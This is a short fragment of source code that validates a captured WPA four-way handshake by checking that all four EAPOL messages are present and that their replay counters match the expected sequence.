    hasMessage1 = hasMessage1 || m1; if (m1 && !rcM1) rcM1 = einfo.replayCounter;
    hasMessage2 = hasMessage2 || m2; if (m2 && !rcM2) rcM2 = einfo.replayCounter;
    hasMessage3 = hasMessage3 || m3; if (m3 && !rcM3) rcM3 = einfo.replayCounter;
    hasMessage4 = hasMessage4 || m4; if (m4 && !rcM4) rcM4 = einfo.replayCounter;
  }
  if (!(staLocked && staConsistent && hasMessage1 && hasMessage2 && hasMessage3 && hasMessage4)) return false;
  if (!(rcM1 && rcM2 && rcM3 && rcM4)) return false;
  if (!rcEquals(rcM1, rcM2)) return false;
  if (!rcIsPlusOne(rcM3, rcM1)) return false;
  if (!rcIsPlusOne(rcM4, rcM1)) return false;
  return true;
}

